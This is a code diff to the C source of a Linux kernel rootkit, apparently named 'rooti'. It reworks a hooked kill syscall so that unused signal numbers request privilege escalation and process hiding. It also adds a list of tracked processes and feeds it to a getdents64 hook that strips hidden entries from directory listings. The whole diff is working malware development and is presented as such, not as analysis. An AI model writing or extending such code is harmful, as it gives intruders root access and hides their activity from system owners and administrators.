@@ -20,6 +20,7 @@
 #include "capabilities/hiding/module.h"
 #include "capabilities/hiding/login.h"
 #include "capabilities/hiding/net.h"
+#include "capabilities/tracking/process.h"
 #include "utils.h"
 #include "config.h"
 
@@ -30,12 +31,13 @@ MODULE_VERSION("1.0.0");
 
 // Unused signal numbers which can be used by the rootkit for its own purposes
 enum rooti_signal {
-    ROOTI_SIG_UNLOAD = 63,  // make the rootkit self destruct by unloading itself
-    ROOTI_SIG_REG = 64      // request by a usermode process to be serviced by the rootkit
+    ROOTI_SIG_PROC_BIND = 62,   // request to bind to a proccess
+    ROOTI_SIG_PROC_HIDE = 63,   // request to hide a process
+    ROOTI_SIG_PE = 64           // request for privilege escalation
 };
 
-// Bitmap in which every bit represents the PID number of a registered client userspace process
-static unsigned char rooti_clients_bitmap[PID_MAX_LIMIT / 8] = {0};
+// List of tracked processes (for each one we track different attributes)
+static LIST_HEAD(rooti_tracked_procs);
 
 // List of /proc directory FDs opened by userspace processes
 static LIST_HEAD(rooti_proc_tracked_fds);
@@ -67,18 +69,16 @@ static ssize_t (*orig_urandom_read_iter)(struct kiocb *kiocb, struct iov_iter *i
 static asmlinkage long hook_kill(const struct pt_regs *regs)
 {
     int sig = regs->si;
-    if (sig == ROOTI_SIG_REG) {
-        // Register the new process
-        rooti_clients_bitmap[current->pid / 8] |= (1U << current->pid % 8);
+
+    if (sig == ROOTI_SIG_PE) {
         return rooti_elevate_privilege();
-    } 
-    else if (sig == ROOTI_SIG_UNLOAD) {
-        // Schedule the unloading of the rootkit
-        return rooti_schedule_self_deletion();
     }
+    else if (sig == ROOTI_SIG_PROC_HIDE) {
+        return rooti_track_proc_attr(current->pid, ROOTI_PROC_HIDDEN, &rooti_tracked_procs);
+    }
+
     return orig_kill(regs);
 }
-
 
 static asmlinkage long hook_openat(const struct pt_regs *regs)
 {
@@ -160,7 +160,7 @@ static asmlinkage long hook_getdents64(const struct pt_regs *regs)
     bool is_proc_dir = rooti_is_tracked_fd(fd, &rooti_proc_tracked_fds);
 
     // Filter any files we wish to hide from the buffer
-    return rooti_hide_dir_entries(user_buf, nread, is_proc_dir, rooti_clients_bitmap);
+    return rooti_hide_dir_entries(user_buf, nread, is_proc_dir, &rooti_tracked_procs);
 }
 
 static asmlinkage long hook_socket(const struct pt_regs *regs)
